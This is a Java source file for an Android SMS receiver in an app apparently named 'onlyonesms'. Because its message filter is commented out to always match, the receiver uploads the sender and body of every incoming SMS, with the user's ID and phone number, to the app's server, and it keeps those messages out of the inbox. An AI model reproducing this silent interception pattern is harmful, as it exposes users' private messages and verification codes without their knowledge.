package mms5.onepagebook.com.onlyonesms.receiver;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.os.Build;
import android.os.Bundle;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.text.TextUtils;

import com.google.android.mms.util_alt.SqliteWrapper;

import java.util.Calendar;
import java.util.GregorianCalendar;

import mms5.onepagebook.com.onlyonesms.api.ApiCallback;
import mms5.onepagebook.com.onlyonesms.api.Client;
import mms5.onepagebook.com.onlyonesms.api.body.SendingChangedNumberBody;
import mms5.onepagebook.com.onlyonesms.api.response.DefaultResult;
import mms5.onepagebook.com.onlyonesms.common.Constants;
import mms5.onepagebook.com.onlyonesms.manager.GsonManager;
import mms5.onepagebook.com.onlyonesms.manager.PreferenceManager;
import mms5.onepagebook.com.onlyonesms.manager.RetrofitManager;
import mms5.onepagebook.com.onlyonesms.model.UserInfo;
import mms5.onepagebook.com.onlyonesms.util.Utils;

public class OnePageSmsReceiver extends BroadcastReceiver implements Constants {
  private static final String ACTION_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

  private static final String EXTRA_ERROR_CODE = "errorCode";

  public static ContentValues parseReceivedSmsMessage(final Context context, final SmsMessage[] msgs, final int error) {
    final SmsMessage sms = msgs[0];
    final ContentValues values = new ContentValues();
    values.put("address", sms.getDisplayOriginatingAddress());
    values.put("body", buildMessageBodyFromPdus(msgs));
    if (hasSmsDateSentColumn(context)) {
      values.put("date_sent", sms.getTimestampMillis());
    }
    values.put("protocol", sms.getProtocolIdentifier());
    if (sms.getPseudoSubject().length() > 0) {
      values.put("subject", sms.getPseudoSubject());
    }
    values.put("reply_path_present", sms.isReplyPathPresent() ? 1 : 0);
    values.put("service_center", sms.getServiceCenterAddress());
    // Error code
    values.put("error_code", error);
    return values;
  }

  public static boolean hasSmsDateSentColumn(Context context) {
    boolean sHasSmsDateSentColumn;
    Cursor cursor = null;
    try {
      final ContentResolver resolver = context.getContentResolver();
      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
        String[] TEST_DATE_SENT_PROJECTION = new String[]{Telephony.Sms.DATE_SENT};
        cursor = SqliteWrapper.query(
          context,
          resolver,
          Telephony.Sms.CONTENT_URI,
          TEST_DATE_SENT_PROJECTION,
          null,
          null,
          Telephony.Sms.DATE_SENT + " ASC LIMIT 1");
        sHasSmsDateSentColumn = true;
      }
      else {
        sHasSmsDateSentColumn = false;
      }

    } catch (final SQLiteException e) {
      sHasSmsDateSentColumn = false;
    } finally {
      if (cursor != null) {
        cursor.close();
      }
    }
    return sHasSmsDateSentColumn;
  }

  private static String buildMessageBodyFromPdus(final SmsMessage[] msgs) {
    if (msgs.length == 1) {
      return replaceFormFeeds(msgs[0].getDisplayMessageBody());
    }
    else {
      final StringBuilder body = new StringBuilder();
      for (final SmsMessage msg : msgs) {
        try {
          body.append(msg.getDisplayMessageBody());
        } catch (NullPointerException ignored) {
        }
      }
      return replaceFormFeeds(body.toString());
    }
  }

  private static String replaceFormFeeds(final String s) {
    return s == null ? "" : s.replace('\f', '\n');
  }

  public static Long getMessageDate(final SmsMessage sms, long now) {
    final Calendar buildDate = new GregorianCalendar(2011, 8, 18);    // 18 Sep 2011
    final Calendar nowDate = new GregorianCalendar();
    nowDate.setTimeInMillis(now);
    if (nowDate.before(buildDate)) {
      now = sms.getTimestampMillis();
    }
    return now;
  }

  @Override
  public void onReceive(Context context, Intent intent) {
    if (ACTION_RECEIVED.equals(intent.getAction())) {
      Bundle bundle = intent.getExtras();
      if (bundle == null) {
        return;
      }

      Object[] data = (Object[]) bundle.get("pdus");
      if (data != null) {
        int errorCode = intent.getIntExtra(EXTRA_ERROR_CODE, 0);
        SmsMessage[] messages = new SmsMessage[data.length];
        boolean hasToInsert = true;
        for (int i = 0; i < data.length; i++) {
          Object pdu = data[i];
          SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
          if (message == null) {
            continue;
          }
          messages[i] = message;
          hasToInsert = distinguish(context, message);
        }

        if (hasToInsert) {
          insertSms(context, messages, errorCode);
        }
      }
    }
  }

  private void insertSms(Context context, SmsMessage[] messages, int errorCode) {
    ContentValues messageValues = parseReceivedSmsMessage(context, messages, errorCode);
    long nowInMillis = System.currentTimeMillis();
    long receivedTimestampMs = getMessageDate(messages[0], nowInMillis);
    messageValues.put("date", receivedTimestampMs);
    messageValues.put("read", 0);
    messageValues.put("seen", 0);

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
      context.getContentResolver().insert(Telephony.Sms.Inbox.CONTENT_URI, messageValues);
    }
  }

  private boolean distinguish(Context context, SmsMessage message) {
    String address = message.getDisplayOriginatingAddress();
    String body = message.getDisplayMessageBody();

    if (checkMsg(body)) {
      uploadSms(context, address, body);
      return false;
    }

    return true;
  }

  private boolean checkMsg(String m) {
    /*if(m.contains(FRAG_01)) {
      if (m.contains(FRAG_S4)) return true;
      if (m.contains(FRAG_S8)) return true;
      if (m.contains(FRAG_S6)) return true;
      if (m.contains(FRAG_S7)) return true;
      if (m.contains(FRAG_S2)) return true;
      if (m.contains(FRAG_S1)) return true;
      if (m.contains(FRAG_S3)) return true;
      if (m.contains(FRAG_S5)) return true;
    }

    return false;*/
    return true;
  }

  private void uploadSms(Context context, String address, String message) {
    if (!TextUtils.isEmpty(PreferenceManager.getInstance(context).getUseJson())) {
      UserInfo userInfo = GsonManager.getGson().fromJson(PreferenceManager.getInstance(context).getUseJson(), UserInfo.class);
      if (!TextUtils.isEmpty(userInfo.id)) {
        String number = Utils.getPhoneNumber(context);
        RetrofitManager.retrofit(context).create(Client.class)
          .sendChangedNumber(new SendingChangedNumberBody(userInfo.id, number, address, message))
          .enqueue(new ApiCallback<DefaultResult>() {
            @Override
            public void onSuccess(DefaultResult response) {
            }

            @Override
            public void onFail(int error, String msg) {
            }
          });
      }
    }
  }
}
